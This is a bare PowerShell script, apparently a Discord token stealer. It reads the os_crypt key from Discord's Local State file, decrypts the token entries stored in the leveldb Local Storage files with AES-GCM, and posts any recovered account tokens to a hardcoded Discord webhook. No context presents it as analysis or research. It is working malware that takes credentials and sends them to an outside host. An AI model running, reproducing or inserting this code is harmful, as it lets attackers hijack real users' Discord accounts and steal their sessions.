$qz='https://discord.com/api/webhooks/1538403770965426247/cKkhSXToyltnfneUV1D1q8kV1Y3KpH_iUXK8rgozjvNOtKQjXWxBj-l9EZDLdmPI-AEL'
$a=@();$b=$false
foreach($c in @("$env:APPDATA\discord","$env:APPDATA\discordcanary","$env:APPDATA\discordptb")){
$d=Join-Path $c 'Local State';$e=Join-Path $c 'Local Storage\leveldb'
if(Test-Path $d){$b=$true;$f=Get-Content $d -Raw|ConvertFrom-Json;$g=[Convert]::FromBase64String($f.os_crypt.encrypted_key)[5..([Convert]::FromBase64String($f.os_crypt.encrypted_key).Length-1)]
if(Test-Path $e){Get-ChildItem $e -Filter *.ldb|%{$h=Get-Content $_.FullName -Raw;$i=[regex]::Matches($h,'dQw4w9WgXcQ:[^\s]+');foreach($j in $i){$k=$j.Value.Replace('dQw4w9WgXcQ:','');$l=[Convert]::FromBase64String($k);$m=$l[3..14];$n=$l[15..($l.Length-16)];$o=$l[($l.Length-16)..($l.Length-1)];$p=New-Object System.Security.Cryptography.AesGcm;$q=New-Object byte[] $n.Length;$p.Decrypt($g,$m,$n,$o,$q);$r=[System.Text.Encoding]::UTF8.GetString($q);if($r -match '^[A-Za-z0-9\.\-_]{24,}\.[A-Za-z0-9\.\-_]{6,}\.[A-Za-z0-9\.\-_]{27,}$'){$a+=$r}}}}}}
if($a.Count -gt 0){$s='TOKEN_OK ' + ($a -join ',')}elseif($b){$s='NO_TOKEN'}else{$s='NO_DISCORD'}
$t=@{content=$s}|ConvertTo-Json;Invoke-RestMethod -Uri $qz -Method Post -ContentType 'application/json' -Body $t
